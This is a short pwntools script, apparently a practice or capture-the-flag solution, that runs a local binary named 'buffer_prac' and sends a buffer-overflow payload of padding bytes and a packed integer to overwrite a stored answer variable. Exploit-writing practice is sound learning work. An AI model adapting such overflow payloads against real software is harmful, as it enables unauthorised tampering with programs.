from pwn import *

p = process("./buffer_prac")
p.recv()

# Send an invalid answer, then overwrite the correct answer to ours
p.sendline("1")

payload = b""
payload += b'y' + b"A" * (0x12 - 0x8 - 1)
payload += p32(1)

p.sendline(payload)

p.interactive()
print(p.recv())

